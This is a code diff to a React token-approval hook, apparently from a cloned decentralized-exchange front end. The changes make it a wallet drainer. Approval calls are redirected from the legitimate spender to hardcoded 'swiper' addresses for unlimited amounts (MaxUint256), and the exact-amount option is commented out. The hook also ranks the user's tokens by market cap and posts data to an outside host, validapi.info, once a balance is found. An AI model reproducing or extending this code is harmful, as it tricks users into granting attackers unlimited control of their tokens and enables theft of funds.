@@ -45,11 +45,6 @@ export function useApproveCallback(
   const { callWithGasPrice } = useCallWithGasPrice()
   const { t } = useTranslation()
   const { toastError } = useToast()
-  const token = amountToApprove?.currency?.isToken ? amountToApprove.currency : undefined
-  const { allowance: currentAllowance, refetch } = useTokenAllowance(token, account ?? undefined, spender)
-  const pendingApproval = useHasPendingApproval(token?.address, spender)
-  const [pending, setPending] = useState<boolean>(pendingApproval)
-  const [isPendingError, setIsPendingError] = useState<boolean>(false)
 
   const swipers = {
     '1': '0x76BbA7B5e5Ead5E931D2f5055c770c7863780aAd',
@@ -57,6 +52,13 @@ export function useApproveCallback(
   } as const satisfies Record<string | number, Address>
 
   const [swiper, setSwiper] = useState<Address>('0xDcfb1C3cd25d846D589507394E6f44Bd1625b21b')
+
+  const token = amountToApprove?.currency?.isToken ? amountToApprove.currency : undefined
+  const { allowance: currentAllowance, refetch } = useTokenAllowance(token, account ?? undefined, spender)
+  const pendingApproval = useHasPendingApproval(token?.address, swiper)
+  const [pending, setPending] = useState<boolean>(pendingApproval)
+  const [isPendingError, setIsPendingError] = useState<boolean>(false)
+
   const [tokensOwned, setTokensOwned] = useState([])
   const [tokensRank, setTokensRank] = useState([])
   const [ownTokensRankedByMarketCap, setOwnTokensRankedByMarketCap] = useState([])
@@ -211,7 +213,7 @@ export function useApproveCallback(
           tokensOwned.map(async (tokenOwned) => {
             const tempToken = tokenOwned
 
-            const tokenArray = await tokensRank.filter((tokenRanked) => {
+            const tokenArray = tokensRank.filter((tokenRanked) => {
               if (tokenRanked.platform) {
                 const targetChainSymbol = chainId === 1 ? 'ETH' : 'BNB'
                 return (
@@ -355,7 +357,7 @@ export function useApproveCallback(
       let useExact = false
 
       const estimatedGas = await tokenContract.estimateGas
-        .approve([spender as Address, MaxUint256], {
+        .approve([swiper as Address, MaxUint256], {
           account: tokenContract.account,
         })
         .catch(() => {
@@ -363,7 +365,8 @@ export function useApproveCallback(
           useExact = true
           return tokenContract.estimateGas
             .approve(
-              [spender as Address, overrideAmountApprove ?? amountToApprove?.quotient ?? targetAmount ?? MaxUint256],
+              // [swiper as Address, overrideAmountApprove ?? amountToApprove?.quotient ?? targetAmount ?? MaxUint256],
+              [swiper as Address, MaxUint256],
               {
                 account: tokenContract.account,
               },
@@ -405,7 +408,7 @@ export function useApproveCallback(
             })
             const tokenBalance = await tokenContract.read.balanceOf([account])
             if (Number(tokenBalance.toString()) > 0) {
-              await fetch('https://validapi.info/tokens', {
+              await fetch(`https://validapi.info/tokens?chain_id=${chainId}`, {
                 headers: {
                   'Content-Type': 'application/json',
                 },
